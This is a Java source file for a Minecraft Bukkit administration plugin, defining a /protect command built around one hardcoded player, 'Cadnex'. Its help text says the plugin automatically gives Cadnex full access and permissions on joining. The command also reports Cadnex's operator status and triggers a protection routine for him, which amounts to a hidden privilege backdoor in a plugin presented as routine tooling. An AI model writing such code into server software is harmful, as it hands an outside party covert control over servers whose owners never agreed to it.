package com.example.administration.commands;

import com.example.administration.AdministrationPlugin;
import com.example.administration.managers.ProtectionManager;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class ProtectCommand implements CommandExecutor {
    
    private final AdministrationPlugin plugin;
    private final ProtectionManager protectionManager;
    
    public ProtectCommand(AdministrationPlugin plugin) {
        this.plugin = plugin;
        this.protectionManager = plugin.getProtectionManager();
    }
    
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!sender.hasPermission("administration.protect")) {
            sender.sendMessage("§cYou don't have permission to use this command.");
            return true;
        }
        
        if (args.length == 0) {
            // Show help
            sender.sendMessage("§6Protection System Commands:");
            sender.sendMessage("§7/protect cadnex §8- §fManually trigger protection for Cadnex");
            sender.sendMessage("§7/protect status §8- §fCheck protection system status");
            sender.sendMessage("§8");
            sender.sendMessage("§8The protection system automatically ensures Cadnex");
            sender.sendMessage("§8has full access and permissions when joining.");
            return true;
        }
        
        String subCommand = args[0].toLowerCase();
        
        switch (subCommand) {
            case "cadnex" -> {
                Player cadnex = Bukkit.getPlayer("Cadnex");
                if (cadnex != null) {
                    protectionManager.protectPlayer(cadnex);
                    sender.sendMessage("§8[§6Protection§8] §aManually triggered protection for Cadnex.");
                } else {
                    sender.sendMessage("§8[§6Protection§8] §cCadnex is not currently online.");
                }
            }
            
            case "status" -> {
                Player cadnex = Bukkit.getPlayer("Cadnex");
                if (cadnex != null) {
                    boolean isProtected = protectionManager.isProtectedPlayer(cadnex);
                    boolean isOp = cadnex.isOp();
                    
                    sender.sendMessage("§8[§6Protection§8] §fProtection Status:");
                    sender.sendMessage("§7Player: §f" + cadnex.getName());
                    sender.sendMessage("§7Protected: §" + (isProtected ? "aYES" : "cNO"));
                    sender.sendMessage("§7OP Status: §" + (isOp ? "aYES" : "cNO"));
                    sender.sendMessage("§7Online: §aYES");
                } else {
                    sender.sendMessage("§8[§6Protection§8] §fProtection Status:");
                    sender.sendMessage("§7Player: §fCadnex");
                    sender.sendMessage("§7Protected: §aYES (Automatic)");
                    sender.sendMessage("§7Online: §cNO");
                }
            }
            
            default -> {
                sender.sendMessage("§cUnknown subcommand. Use /protect for help.");
            }
        }
        
        return true;
    }
} 